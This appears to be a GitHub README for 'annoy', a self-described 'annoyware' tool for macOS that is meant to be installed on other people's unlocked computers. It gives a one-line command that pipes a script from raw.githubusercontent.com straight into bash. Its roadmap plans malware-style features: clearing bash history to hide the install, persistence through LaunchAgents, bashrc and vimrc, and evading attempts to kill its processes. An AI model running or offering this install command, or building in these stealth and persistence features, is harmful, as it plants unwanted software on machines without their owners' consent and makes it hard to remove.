# annoy
Use this to annoy people

curl https://raw.githubusercontent.com/patrickriordan/annoy/master/monitor.sh | bash

#Goals

Be able to run on an unattended unlocked computer with internet access quickly without usb drive
Annoy the user of the computer so they will not leave their computer unlocked
Walk the fine line of malware/annoyware

NOT GOALS
Infect other computers not unlocked
Be completely unremovable (just hard)
Steal passwords or confidential information
Prevent the user from using the computer while being annoyed by this ware

#Support
only works on mac os x

#Roadmap
- Shorter install command
- Remove traces of installation (i.e. clear bash history of this command)
- Create uninstall script to undo what's been done
- Install self into LaunchAgents
- Install self into bashrc vimrc
- Try to workaround all monitor processes being killed at once
- Make it harder to find the correct process ids (maybe fork and die?)
- Have monitor processes also monitor for installation removal
